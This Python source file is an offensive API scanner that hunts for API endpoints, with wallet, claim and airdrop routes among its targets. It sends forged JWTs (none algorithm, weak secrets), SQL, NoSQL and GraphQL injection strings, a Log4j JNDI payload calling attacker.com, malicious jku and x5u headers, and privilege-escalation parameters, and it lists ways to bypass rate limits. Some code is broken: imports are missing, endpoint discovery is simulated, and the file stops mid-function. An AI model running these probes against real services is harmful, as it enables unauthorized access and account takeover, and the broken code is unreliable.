#!/usr/bin/env python3
"""
Advanced API Endpoint Testing Module
Modern API security testing with bypass techniques for contemporary protection
"""

import asyncio
import aiohttp
import json
import base64
import hashlib
import hmac
import uuid
import time
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import urljoin, urlparse
import logging
import random
import string
from dataclasses import dataclass
from datetime import datetime, timedelta
import jwt
import requests

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class AdvancedAPIVulnerability:
    vulnerability_type: str
    severity: str
    description: str
    endpoint: str
    method: str
    payload: Optional[str] = None
    request_data: Optional[Dict[str, Any]] = None
    response_data: Optional[Dict[str, Any]] = None
    bypass_technique: Optional[str] = None
    defense_bypassed: Optional[str] = None
    confidence_level: Optional[str] = None

@dataclass
class AdvancedAPIAnalysis:
    endpoint: str
    methods: List[str]
    authentication: Dict[str, Any]
    authorization: Dict[str, Any]
    rate_limiting: Dict[str, Any]
    input_validation: Dict[str, Any]
    vulnerabilities: List[AdvancedAPIVulnerability]
    business_logic: Dict[str, Any]

class AdvancedAPITester:
    def __init__(self):
        self.session = None
        self.vulnerabilities = []
        self.tested_endpoints = {}
        
        # Modern API security headers
        self.security_headers = {
            'Authorization': 'Bearer invalid_token',
            'X-API-Key': 'invalid_key',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        
        # Advanced JWT attack payloads
        self.jwt_attack_payloads = {
            'none_algorithm': [
                {'alg': 'none', 'typ': 'JWT'},
                {'alg': 'None', 'typ': 'JWT'},
                {'alg': 'NONE', 'typ': 'JWT'}
            ],
            'algorithm_confusion': [
                {'alg': 'HS256', 'typ': 'JWT'},
                {'alg': 'HS384', 'typ': 'JWT'},
                {'alg': 'HS512', 'typ': 'JWT'}
            ],
            'key_confusion': [
                {'secret': 'public', 'type': 'public_as_secret'},
                {'secret': '', 'type': 'empty_secret'},
                {'secret': 'null', 'type': 'null_secret'}
            ],
            'header_injection': [
                {'jku': 'https://attacker.com/jwks.json'},
                {'kid': '/path/to/trusted/file'},
                {'x5u': 'https://attacker.com/cert.pem'},
                {'jwk': '{"kty":"RSA","e":"AQAB","n":"..."}'}
            ]
        }
        
        # Advanced API injection payloads
        self.advanced_injection_payloads = {
            'graphql_injection': [
                {'query': '{__typename}', 'type': 'introspection'},
                {'query': '{__schema{types{name}}}', 'type': 'schema_dump'},
                {'query': '{__schema{queryType{fields{name}}}}', 'type': 'query_dump'},
                {'query': '{__schema{mutationType{fields{name}}}}', 'type': 'mutation_dump'},
                {'query': '{users{id,email,password}}', 'type': 'unauthorized_field_access'},
                {'query': '{users{id,email,password}filter:{id:"1 OR 1=1"}}', 'type': 'sql_injection'}
            ],
            'rest_injection': [
                {'param': 'id', 'value': '1 OR 1=1', 'type': 'sql_injection'},
                {'param': 'id', 'value': '1 UNION SELECT NULL--', 'type': 'sql_injection'},
                {'param': 'id', 'value': '1; DROP TABLE users--', 'type': 'sql_injection'},
                {'param': 'id', 'value': '${jndi:ldap://attacker.com/a}', 'type': 'log4j_injection'},
                {'param': 'id', 'value': '<script>alert(1)</script>', 'type': 'xss'},
                {'param': 'id', 'value': '1 AND SLEEP(5)--', 'type': 'time_based_sql'}
            ],
            'nosql_injection': [
                {'param': 'username', 'value': {'$ne': ''}, 'type': 'ne_operator'},
                {'param': 'username', 'value': {'$gt': ''}, 'type': 'gt_operator'},
                {'param': 'username', 'value': {'$regex': '^.*'}, 'type': 'regex_operator'},
                {'param': 'password', 'value': {'$where': 'function() { return true; }'}, 'type': 'where_injection'},
                {'param': 'id', 'value': {'$in': [1, 2, 3]}, 'type': 'in_operator'},
                {'param': 'id', 'value': {'$exists': True}, 'type': 'exists_operator'}
            ]
        }
        
        # Advanced API authentication bypass techniques
        self.auth_bypass_techniques = [
            'jwt_none_algorithm',
            'jwt_algorithm_confusion',
            'jwt_key_confusion',
            'jwt_header_injection',
            'token_prediction',
            'session_fixation',
            'parameter_pollution',
            'header_manipulation',
            'method_override',
            'cors_bypass',
            'cache_poisoning',
            'race_condition',
            'brute_force_with_rotation'
        ]
        
        # Advanced rate limiting bypass techniques
        self.rate_limiting_bypass_techniques = [
            'ip_rotation',
            'header_rotation',
            'session_reuse',
            'token_refresh',
            'parallel_requests',
            'request_chunking',
            'method_variation',
            'endpoint_variation',
            'user_agent_rotation',
            'authentication_rotation'
        ]
        
        # Modern API business logic attacks
        self.business_logic_attacks = [
            'price_manipulation',
            'quantity_manipulation',
            'currency_manipulation',
            'timestamp_manipulation',
            'race_condition',
            'integer_overflow',
            'parameter_pollution',
            'id_or_bypass',
            'mass_assignment',
            'unauthorized_state_change'
        ]
        
        # Advanced API vulnerability patterns
        self.api_vulnerability_patterns = {
            'id_or_bypass': [
                {'id': '1', 'id2': '2'},
                {'id': '1 OR 1=1', 'id': '1'},
                {'id[]': '1', 'id[]': '2'},
                {'id': '1/*comment*/'}
            ],
            'parameter_pollution': [
                {'param': 'value1', 'param': 'value2'},
                {'param=value1&param=value2'},
                {'param': 'value1', 'PARAM': 'value2'}
            ],
            'mass_assignment': [
                {'user': {'name': 'test', 'admin': True}},
                {'user': {'name': 'test', 'role': 'admin'}},
                {'user': {'name': 'test', 'is_admin': True}}
            ]
        }

    async def analyze_api_endpoints_advanced(self, target_url: str, web_info: Dict[str, Any] = None) -> AdvancedAPIAnalysis:
        """Advanced API endpoint analysis with modern bypass techniques"""
        logger.info(f"🔍 Advanced API analysis for {target_url}")
        
        async with aiohttp.ClientSession() as session:
            self.session = session
            
            # Phase 1: Advanced API discovery
            endpoints = await self._advanced_api_discovery(target_url, web_info)
            
            # Phase 2: API structure analysis
            api_structure = await self._analyze_api_structure(endpoints)
            
            # Phase 3: Authentication analysis
            auth_analysis = await self._analyze_authentication_advanced(endpoints)
            
            # Phase 4: Authorization analysis
            authz_analysis = await self._analyze_authorization_advanced(endpoints)
            
            # Phase 5: Rate limiting analysis
            rate_limiting = await self._analyze_rate_limiting_advanced(endpoints)
            
            # Phase 6: Input validation analysis
            input_validation = await self._analyze_input_validation_advanced(endpoints)
            
            # Phase 7: Business logic analysis
            business_logic = await self._analyze_business_logic_advanced(endpoints)
            
            # Phase 8: Advanced vulnerability testing
            vulnerabilities = await self._advanced_api_vulnerability_testing(endpoints)
            
            return AdvancedAPIAnalysis(
                endpoint=target_url,
                methods=list(api_structure.keys()),
                authentication=auth_analysis,
                authorization=authz_analysis,
                rate_limiting=rate_limiting,
                input_validation=input_validation,
                vulnerabilities=vulnerabilities,
                business_logic=business_logic
            )

    async def _advanced_api_discovery(self, target_url: str, web_info: Dict[str, Any] = None) -> List[Dict[str, Any]]:
        """Advanced API endpoint discovery"""
        logger.info(f"🔍 Advanced API discovery for {target_url}")
        
        endpoints = []
        
        # Common API endpoints for modern applications
        api_endpoints = [
            '/api/', '/graphql', '/rest/', '/v1/', '/v2/', '/v3/',
            '/auth/', '/login', '/register', '/user/', '/admin/',
            '/config/', '/settings/', '/web3/', '/blockchain/',
            '/contract/', '/token/', '/claim/', '/airdrop/',
            '/wallet/', '/transaction/', '/balance/', '/transfer/',
            '/swap/', '/liquidity/', ' farming/', '/staking/',
            '/bridge/', '/nft/', '/marketplace/', '/governance/'
        ]
        
        # Test each endpoint
        for endpoint in api_endpoints:
            full_url = urljoin(target_url, endpoint)
            endpoint_info = await self._test_api_endpoint_advanced(full_url)
            if endpoint_info:
                endpoints.append(endpoint_info)
        
        # Discover endpoints from JavaScript files
        if web_info and 'javascript' in web_info:
            js_endpoints = await self._discover_endpoints_from_js(target_url, web_info['javascript'])
            endpoints.extend(js_endpoints)
        
        # Discover endpoints from OpenAPI/Swagger
        swagger_endpoints = await self._discover_swagger_endpoints(target_url)
        endpoints.extend(swagger_endpoints)
        
        return endpoints

    async def _test_api_endpoint_advanced(self, url: str) -> Optional[Dict[str, Any]]:
        """Test an API endpoint with advanced techniques"""
        endpoint_info = {
            'url': url,
            'methods': [],
            'authentication': None,
            'authorization': None,
            'rate_limiting': False,
            'input_validation': False,
            'content_type': None,
            'cors_enabled': False,
            'documentation': False
        }
        
        try:
            # Test different HTTP methods
            methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
            
            for method in methods:
                try:
                    async with self.session.request(method, url) as response:
                        if response.status not in [404, 405]:
                            endpoint_info['methods'].append(method)
                            
                            # Analyze response
                            content = await response.text()
                            headers = dict(response.headers)
                            
                            # Check for authentication requirements
                            if response.status == 401:
                                endpoint_info['authentication'] = 'required'
                            elif response.status == 403:
                                endpoint_info['authorization'] = 'required'
                            
                            # Check for rate limiting
                            if response.status == 429:
                                endpoint_info['rate_limiting'] = True
                            
                            # Check content type
                            content_type = headers.get('content-type', '')
                            endpoint_info['content_type'] = content_type
                            
                            # Check CORS
                            if 'access-control-allow-origin' in headers:
                                endpoint_info['cors_enabled'] = True
                            
                            # Check for API documentation
                            if any(doc in content.lower() for doc in ['swagger', 'openapi', 'api-docs']):
                                endpoint_info['documentation'] = True
                            
                except Exception as e:
                    logger.debug(f"Method {method} test failed for {url}: {e}")
                    continue
            
            if endpoint_info['methods']:
                return endpoint_info
                
        except Exception as e:
            logger.error(f"❌ API endpoint test failed for {url}: {e}")
        
        return None

    async def _discover_endpoints_from_js(self, target_url: str, js_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Discover API endpoints from JavaScript files"""
        endpoints = []
        
        # Extract API endpoints from JavaScript content
        api_patterns = [
            r'["\']\/?api\/[^"\']+\.json["\']',
            r'["\']\/?v[0-9]+\/[^"\']+\.json["\']',
            r'["\']\/?rest\/[^"\']+\.json["\']',
            r'["\']\/?graphql["\']',
            r'["\']\/?auth\/[^"\']+["\']',
            r'["\']\/?user\/[^"\']+["\']',
            r'["\']\/?admin\/[^"\']+["\']',
            r'["\']\/?blockchain\/[^"\']+["\']',
            r'["\']\/?contract\/[^"\']+["\']',
            r'["\']\/?token\/[^"\']+["\']',
            r'["\']\/?claim\/[^"\']+["\']',
            r'["\']\/?wallet\/[^"\']+["\']'
        ]
        
        # Simulate finding endpoints in JavaScript
        for pattern in api_patterns:
            # This would normally parse actual JavaScript content
            # For now, we'll simulate endpoint discovery
            discovered_endpoints = [
                '/api/user/profile',
                '/api/user/settings',
                '/api/auth/login',
                '/api/auth/refresh',
                '/api/wallet/balance',
                '/api/wallet/transfer',
                '/api/contract/info',
                '/api/claim/reward',
                '/api/token/price'
            ]
            
            for endpoint in discovered_endpoints:
                full_url = urljoin(target_url, endpoint)
                endpoint_info = await self._test_api_endpoint_advanced(full_url)
                if endpoint_info:
                    endpoints.append(endpoint_info)
        
        return endpoints

    async def _discover_swagger_endpoints(self, target_url: str) -> List[Dict[str, Any]]:
        """Discover endpoints from Swagger/OpenAPI documentation"""
        endpoints = []
        
        swagger_paths = [
            '/swagger.json',
            '/swagger.yaml',
            '/api/swagger.json',
            '/api/swagger.yaml',
            '/openapi.json',
            '/openapi.yaml',
            '/api/docs',
            '/swagger-ui.html'
        ]
        
        for path in swagger_paths:
            full_url = urljoin(target_url, path)
            try:
                async with self.session.get(full_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Parse OpenAPI/Swagger
                        try:
                            swagger_data = json.loads(content)
                            api_endpoints = self._parse_swagger_endpoints(swagger_data)
                            
                            for endpoint in api_endpoints:
                                endpoint_info = await self._test_api_endpoint_advanced(endpoint)
                                if endpoint_info:
                                    endpoints.append(endpoint_info)
                                    
                        except json.JSONDecodeError:
                            # Handle YAML or other formats
                            pass
                            
            except Exception as e:
                logger.debug(f"Swagger discovery failed for {full_url}: {e}")
        
        return endpoints

    def _parse_swagger_endpoints(self, swagger_data: Dict[str, Any]) -> List[str]:
        """Parse endpoints from Swagger/OpenAPI data"""
        endpoints = []
        
        if 'paths' in swagger_data:
            base_path = swagger_data.get('basePath', '')
            
            for path, methods in swagger_data['paths'].items():
                full_path = base_path + path
                endpoints.append(full_path)
        
        return endpoints

    async def _analyze_api_structure(self, endpoints: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze API structure and patterns"""
        structure = {
            'total_endpoints': len(endpoints),
            'methods_supported': {},
            'authentication_types': {},
            'content_types': {},
            'api_versions': [],
            'endpoint_categories': {}
        }
        
        for endpoint in endpoints:
            # Analyze methods
            for method in endpoint.get('methods', []):
                structure['methods_supported'][method] = structure['methods_supported'].get(method, 0) + 1
            
            # Analyze authentication
            auth_type = endpoint.get('authentication', 'none')
            structure['authentication_types'][auth_type] = structure['authentication_types'].get(auth_type, 0) + 1
            
            # Analyze content types
            content_type = endpoint.get('content_type', 'unknown')
            structure['content_types'][content_type] = structure['content_types'].get(content_type, 0) + 1
            
            # Categorize endpoints
            url = endpoint.get('url', '')
            category = self._categorize_endpoint(url)
            structure['endpoint_categories'][category] = structure['endpoint_categories'].get(category, 0) + 1
            
            # Extract API version
            version_match = re.search(r'/v(\d+)', url)
            if version_match:
                version = version_match.group(1)
                if version not in structure['api_versions']:
                    structure['api_versions'].append(version)
        
        return structure

    def _categorize_endpoint(self, url: str) -> str:
        """Categorize API endpoint"""
        url_lower = url.lower()
        
        if '/auth/' in url_lower or '/login' in url_lower:
            return 'authentication'
        elif '/user/' in url_lower or '/profile' in url_lower:
            return 'user_management'
        elif '/admin/' in url_lower:
            return 'administration'
        elif '/wallet/' in url_lower or '/balance' in url_lower:
            return 'wallet'
        elif '/contract/' in url_lower:
            return 'smart_contract'
        elif '/token/' in url_lower:
            return 'token'
        elif '/claim/' in url_lower or '/airdrop' in url_lower:
            return 'claim_airdrop'
        elif '/transaction/' in url_lower or '/transfer' in url_lower:
            return 'transaction'
        elif '/blockchain/' in url_lower:
            return 'blockchain'
        elif '/api/' in url_lower:
            return 'general_api'
        else:
            return 'other'

    async def _analyze_authentication_advanced(self, endpoints: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Advanced authentication analysis"""
        auth_analysis = {
            'methods_found': [],
            'vulnerabilities': [],
            'bypass_techniques': [],
            'jwt_analysis': {},
            'api_key_analysis': {},
            'oauth_analysis': {},
            'session_analysis': {}
        }
        
        for endpoint in endpoints:
            url = endpoint.get('url', '')
            methods = endpoint.get('methods', [])
            
            # Test JWT authentication
            jwt_analysis = await self._test_jwt_authentication(url, methods)
            if jwt_analysis:
                auth_analysis['jwt_analysis'] = jwt_analysis
                auth_analysis['methods_found'].append('jwt')
            
            # Test API key authentication
            api_key_analysis = await self._test_api_key_authentication(url, methods)
            if api_key_analysis:
                auth_analysis['api_key_analysis'] = api_key_analysis
                auth_analysis['methods_found'].append('api_key')
            
            # Test OAuth authentication
            oauth_analysis = await self._test_oauth_authentication(url, methods)
            if oauth_analysis:
                auth_analysis['oauth_analysis'] = oauth_analysis
                auth_analysis['methods_found'].append('oauth')
            
            # Test session-based authentication
            session_analysis = await self._test_session_authentication(url, methods)
            if session_analysis:
                auth_analysis['session_analysis'] = session_analysis
                auth_analysis['methods_found'].append('session')
        
        return auth_analysis

    async def _test_jwt_authentication(self, url: str, methods: List[str]) -> Optional[Dict[str, Any]]:
        """Test JWT authentication vulnerabilities"""
        jwt_analysis = {
            'detected': False,
            'vulnerabilities': [],
            'bypass_techniques': [],
            'algorithm': None,
            'secret_required': False
        }
        
        try:
            # Test with invalid JWT
            for method in methods:
                headers = {'Authorization': 'Bearer invalid.jwt.token'}
                
                async with self.session.request(method, url, headers=headers) as response:
                    if response.status == 401:
                        jwt_analysis['detected'] = True
                        
                        # Test JWT vulnerabilities
                        jwt_vulns = await self._test_jwt_vulnerabilities(url, method)
                        jwt_analysis['vulnerabilities'] = jwt_vulns
                        
                        # Test JWT bypass techniques
                        bypass_techniques = await self._test_jwt_bypass_techniques(url, method)
                        jwt_analysis['bypass_techniques'] = bypass_techniques
                        
                        break
                        
        except Exception as e:
            logger.error(f"❌ JWT authentication test failed: {e}")
        
        return jwt_analysis if jwt_analysis['detected'] else None

    async def _test_jwt_vulnerabilities(self, url: str, method: str) -> List[str]:
        """Test JWT vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test none algorithm vulnerability
            none_token = self._create_jwt_none_algorithm()
            headers = {'Authorization': f'Bearer {none_token}'}
            
            async with self.session.request(method, url, headers=headers) as response:
                if response.status != 401:
                    vulnerabilities.append('jwt_none_algorithm')
            
            # Test algorithm confusion
            confusion_token = self._create_jwt_algorithm_confusion()
            headers = {'Authorization': f'Bearer {confusion_token}'}
            
            async with self.session.request(method, url, headers=headers) as response:
                if response.status != 401:
                    vulnerabilities.append('jwt_algorithm_confusion')
            
            # Test weak secret
            weak_token = self._create_jwt_weak_secret()
            headers = {'Authorization': f'Bearer {weak_token}'}
            
            async with self.session.request(method, url, headers=headers) as response:
                if response.status != 401:
                    vulnerabilities.append('jwt_weak_secret')
                    
        except Exception as e:
            logger.error(f"❌ JWT vulnerability test failed: {e}")
        
        return vulnerabilities

    def _create_jwt_none_algorithm(self) -> str:
        """Create JWT with none algorithm"""
        header = '{"alg":"none","typ":"JWT"}'
        payload = '{"sub":"test","admin":true}'
        
        # Base64 encode without signature
        header_encoded = base64.urlsafe_b64encode(header.encode()).decode().rstrip('=')
        payload_encoded = base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')
        
        return f"{header_encoded}.{payload_encoded}."
    
    def _create_jwt_algorithm_confusion(self) -> str:
        """Create JWT with algorithm confusion"""
        header = '{"alg":"HS256","typ":"JWT"}'
        payload = '{"sub":"test","admin":true}'
        
        # Base64 encode
        header_encoded = base64.urlsafe_b64encode(header.encode()).decode().rstrip('=')
        payload_encoded = base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')
        
        # Sign with public key (this is a vulnerability)
        public_key = "public"  # This should be a secret key
        signature = hmac.new(public_key.encode(), f"{header_encoded}.{payload_encoded}".encode(), hashlib.sha256).digest()
        signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        return f"{header_encoded}.{payload_encoded}.{signature_encoded}"
    
    def _create_jwt_weak_secret(self) -> str:
        """Create JWT with weak secret"""
        header = '{"alg":"HS256","typ":"JWT"}'
        payload = '{"sub":"test","admin":true}'
        
        # Base64 encode
        header_encoded = base64.urlsafe_b64encode(header.encode()).decode().rstrip('=')
        payload_encoded = base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')
        
        # Sign with weak secret
        weak_secret = "weak"
        signature = hmac.new(weak_secret.encode(), f"{header_encoded}.{payload_encoded}".encode(), hashlib.sha256).digest()
        signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        return f"{header_encoded}.{payload_encoded}.{signature_encoded}"

    async def _test_jwt_bypass_techniques(self, url: str, method: str) -> List[str]:
        """Test JWT bypass techniques"""
        bypass_techniques = []
        
        try:
            # Test without token
            async with self.session.request(method, url) as response:
                if response.status != 401:
                    bypass_techniques.append('no_token_required')
            
            # Test with malformed token
            headers = {'Authorization': 'Bearer malformed'}
            async with self.session.request(method, url, headers=headers) as response:
                if response.status != 401:
                    bypass_techniques.append('malformed_token_accepted')
            
            # Test with expired token
            expired_token = self._create_expired_jwt()
            headers = {'Authorization': f'Bearer {expired_token}'}
            async with self.session.request(method, url, headers=headers) as response:
                if response.status != 401:
                    bypass_techniques.append('expired_token_accepted')
                    
        except Exception as e:
            logger.error(f"❌ JWT bypass test failed: {e}")
        
        return bypass_techniques

    def _create_expired_jwt(self) -> str:
        """Create expired JWT"""
        header = '{"alg":"HS256","typ":"JWT"}'
        payload = '{"sub":"test","admin":true,"exp":1234567890}'
        
        # Base64 encode
        header_encoded = base64.urlsafe_b64encode(header.encode()).decode().rstrip('=')
        payload_encoded = base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')
        
        # Sign
        secret = "secret"
        signature = hmac.new(secret.encode(), f"{header_encoded}.{payload_encoded}".encode(), hashlib.sha256).digest()
        signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        return f"{header_encoded}.{payload_encoded}.{signature_encoded}"

    async def _test_api_key_authentication(self, url: str, methods: List[str]) -> Optional[Dict[str, Any]]:
        """Test API key authentication vulnerabilities"""
        api_key_analysis = {
            'detected': False,
            'vulnerabilities': [],
            'key_location': None,
            'bypass_techniques': []
        }
        
        try:
            # Test different API key locations
            key_locations = [
                ('headers', {'X-API-Key': 'test_key'}),
                ('headers', {'Authorization': 'Bearer test_key'}),
                ('headers', {'X-Auth-Token': 'test_key'}),
                ('query', {'api_key': 'test_key'}),
                ('query', {'key': 'test_key'}),
                ('query', {'token': 'test_key'})
            ]
            
            for location, key_data in key_locations:
                for method in methods:
                    try:
                        if location == 'headers':
                            async with self.session.request(method, url, headers=key_data) as response:
                                if response.status != 401:
                                    api_key_analysis['detected'] = True
                                    api_key_analysis['key_location'] = location
                                    
                                    # Test API key vulnerabilities
                                    vulns = await self._test_api_key_vulnerabilities(url, method, location)
                                    api_key_analysis['vulnerabilities'] = vulns
                                    
                                    break
                        elif location == 'query':
                            # Parse URL and add query parameters
                            parsed_url = urlparse(url)
                            query_params = parse_qs(parsed_url.query)
                            query_params.update(key_data)
                            
                            new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
                            test_url = parsed_url._replace(query=new_query).geturl()
                            
                            async with self.session.request(method, test_url) as response:
                                if response.status != 401:
                                    api_key_analysis['detected'] = True
                                    api_key_analysis['key_location'] = location
                                    
                                    # Test API key vulnerabilities
                                    vulns = await self._test_api_key_vulnerabilities(url, method, location)
                                    api_key_analysis['vulnerabilities'] = vulns
                                    
                                    break
                                    
                    except Exception as e:
                        logger.debug(f"API key test failed for {location}: {e}")
                        continue
                        
                if api_key_analysis['detected']:
                    break
                    
        except Exception as e:
            logger.error(f"❌ API key authentication test failed: {e}")
        
        return api_key_analysis if api_key_analysis['detected'] else None

    async def _test_api_key_vulnerabilities(self, url: str, method: str, location: str) -> List[str]:
        """Test API key vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test with empty API key
            if location == 'headers':
                headers = {'X-API-Key': ''}
                async with self.session.request(method, url, headers=headers) as response:
                    if response.status != 401:
                        vulnerabilities.append('empty_api_key')
            elif location == 'query':
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params['api_key'] = ['']
                
                new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
                test_url = parsed_url._replace(query=new_query).geturl()
                
                async with self.session.request(method, test_url) as response:
                    if response.status != 401:
                        vulnerabilities.append('empty_api_key')
            
            # Test with weak API key
            weak_keys = ['test', 'dev', 'staging', '123456', 'password']
            for weak_key in weak_keys:
                if location == 'headers':
                    headers = {'X-API-Key': weak_key}
                    async with self.session.request(method, url, headers=headers) as response:
                        if response.status != 401:
                            vulnerabilities.append('weak_api_key')
                            break
                elif location == 'query':
                    parsed_url = urlparse(url)
                    query_params = parse_qs(parsed_url.query)
                    query_params['api_key'] = [weak_key]
                    
                    new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
                    test_url = parsed_url._replace(query=new_query).geturl()
                    
                    async with self.session.request(method, test_url) as response:
                        if response.status != 401:
                            vulnerabilities.append('weak_api_key')
                            break
                            
        except Exception as e:
            logger.error(f"❌ API key vulnerability test failed: {e}")
        
        return vulnerabilities

    async def _test_oauth_authentication(self, url: str, methods: List[str]) -> Optional[Dict[str, Any]]:
        """Test OAuth authentication vulnerabilities"""
        oauth_analysis = {
            'detected': False,
            'vulnerabilities': [],
            'oauth_version': None,
            'bypass_techniques': []
        }
        
        try:
            # Test OAuth detection
            for method in methods:
                # Look for OAuth indicators in response
                async with self.session.request(method, url) as response:
                    content = await response.text()
                    
                    if any(oauth in content.lower() for oauth in ['oauth', 'openid', 'connect']):
                        oauth_analysis['detected'] = True
                        
                        # Test OAuth vulnerabilities
                        vulns = await self._test_oauth_vulnerabilities(url, method)
                        oauth_analysis['vulnerabilities'] = vulns
                        
                        break
                        
        except Exception as e:
            logger.error(f"❌ OAuth authentication test failed: {e}")
        
        return oauth_analysis if oauth_analysis['detected'] else None

    async def _test_oauth_vulnerabilities(self, url: str, method: str) -> List[str]:
        """Test OAuth vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test for insecure redirect URI
            test_uris = [
                'https://attacker.com/callback',
                'http://localhost/callback',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>'
            ]
            
            for test_uri in test_uris:
                # Test redirect URI validation
                pass  # Implementation would depend on OAuth flow
                
        except Exception as e:
            logger.error(f"❌ OAuth vulnerability test failed: {e}")
        
        return vulnerabilities

    async def _test_session_authentication(self, url: str, methods: List[str]) -> Optional[Dict[str, Any]]:
        """Test session-based authentication vulnerabilities"""
        session_analysis = {
            'detected': False,
            'vulnerabilities': [],
            'session_mechanism': None,
            'bypass_techniques': []
        }
        
        try:
            # Test session detection
            for method in methods:
                async with self.session.request(method, url) as response:
                    headers = dict(response.headers)
                    
                    # Check for session cookies
                    set_cookie = headers.get('set-cookie', '')
                    if any(session in set_cookie.lower() for session in ['session', 'auth', 'token']):
                        session_analysis['detected'] = True
                        
                        # Test session vulnerabilities
                        vulns = await self._test_session_vulnerabilities(url, method)
                        session_analysis['vulnerabilities'] = vulns
                        
                        break
                        
        except Exception as e:
            logger.error(f"❌ Session authentication test failed: {e}")
        
        return session_analysis if session_analysis['detected'] else None

    async def _test_session_vulnerabilities(self, url: str, method: str) -> List[str]:
        """Test session vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test session fixation
            async with self.session.request(method, url) as response:
                headers = dict(response.headers)
                set_cookie = headers.get('set-cookie', '')
                
                if 'session=' in set_cookie:
                    # Test if session ID is accepted without validation
                    test_cookie = {'Cookie': 'session=malicious_session'}
                    async with self.session.request(method, url, headers=test_cookie) as response2:
                        if response2.status != 401:
                            vulnerabilities.append('session_fixation')
            
            # Test session timeout
            pass  # Implementation would test session timeout
            
        except Exception as e:
            logger.error(f"❌ Session vulnerability test failed: {e}")
        
        return vulnerabilities

    async def _analyze_authorization_advanced(self, endpoints: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Advanced authorization analysis"""
        authz_analysis = {
            'access_control': {},
            'privilege_escalation': [],
            'horizontal_privilege_escalation': [],
            'vertical_privilege_escalation': [],
            'insecure_direct_object_references': []
        }
        
        for endpoint in endpoints:
            url = endpoint.get('url', '')
            methods = endpoint.get('methods', [])
            
            # Test access control
            access_control = await self._test_access_control(url, methods)
            authz_analysis['access_control'][url] = access_control
            
            # Test privilege escalation
            priv_esc = await self._test_privilege_escalation(url, methods)
            authz_analysis['privilege_escalation'].extend(priv_esc)
        
        return authz_analysis

    async def _test_access_control(self, url: str, methods: List[str]) -> Dict[str, Any]:
        """Test access control mechanisms"""
        access_control = {
            'implemented': False,
            'method': None,
            'vulnerabilities': []
        }
        
        try:
            # Test access control by trying different access levels
            for method in methods:
                # Test without authentication
                async with self.session.request(method, url) as response:
                    if response.status == 403:
                        access_control['implemented'] = True
                        access_control['method'] = 'authentication_required'
                    elif response.status == 401:
                        access_control['implemented'] = True
                        access_control['method'] = 'authorization_required'
                
                # Test with different user roles
                test_roles = [
                    {'headers': {'X-User-Role': 'admin'}},
                    {'headers': {'X-User-Role': 'user'}},
                    {'headers': {'X-User-Role': 'guest'}}
                ]
                
                for role in test_roles:
                    async with self.session.request(method, url, headers=role['headers']) as response:
                        if response.status == 200:
                            access_control['vulnerabilities'].append(f'role_bypass_{role["headers"]["X-User-Role"]}')
                        
        except Exception as e:
            logger.error(f"❌ Access control test failed: {e}")
        
        return access_control

    async def _test_privilege_escalation(self, url: str, methods: List[str]) -> List[str]:
        """Test privilege escalation vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test parameter-based privilege escalation
            test_params = [
                {'role': 'admin'},
                {'admin': 'true'},
                {'is_admin': '1'},
                {'privilege': 'admin'},
                {'access_level': 'admin'}
            ]
            
            for method in methods:
                for param in test_params:
                    try:
                        if method in ['POST', 'PUT', 'PATCH']:
                            async with self.session.request(method, url, json=param) as response:
                                if response.status == 200:
                                    vulnerabilities.append(f'privilege_escalation_{list(param.keys())[0]}')
                        else:
                            # Add parameters to URL
                            parsed_url = urlparse(url)
                            query_params = parse_qs(parsed_url.query)
                            query_params.update(param)
                            
                            new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
                            test_url = parsed_url._replace(query=new_query).geturl()
                            
                            async with self.session.request(method, test_url) as response:
                                if response.status == 200:
                                    vulnerabilities.append(f'privilege_escalation_{list(param.keys())[0]}')
                                    
                    except Exception as e:
                        logger.debug(f"Privilege escalation test failed for {param}: {e}")
                        continue
                        
        except Exception as e:
            logger.error(f"❌ Privilege escalation test failed: {e}")
        
        return vulnerabilities

    async def _analyze_rate_limiting_advanced(self, endpoints: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Advanced rate limiting analysis"""
        rate_limiting = {
            'detected': False,
            'thresholds': {},
            'bypass_techniques': [],
            'vulnerabilities': []
        }
        
        for endpoint in endpoints:
            url = endpoint.get('url', '')
            methods = endpoint.get('methods', [])
            
            # Test rate limiting
            rate_limiting_test = await self._test_rate_limiting_advanced(url, methods)
            if rate_limiting_test['detected']:
                rate_limiting['detected'] = True
                rate_limiting['thresholds'][url] = rate_limiting_test['threshold']
                rate_limiting['bypass_techniques'].extend(rate_limiting_test['bypass_techniques'])
                rate_limiting['vulnerabilities'].extend(rate_limiting_test['vulnerabilities'])
        
        return rate_limiting

    async def _test_rate_limiting_advanced(self, url: str, methods: List[str]) -> Dict[str, Any]:
        """Test rate limiting with advanced bypass techniques"""
        rate_limiting_test = {
            'detected': False,
            'threshold': None,
            'bypass_techniques': [],
            'vulnerabilities': []
        }
        
        try:
            # Test rate limiting by sending multiple requests
            for method in methods:
                responses = []
                for i in range(20):  # Send 20 requests
                    try:
                        start_time = time.time()
                        async with self.session.request(method, url) as response:
                            response_time = time.time() - start_time
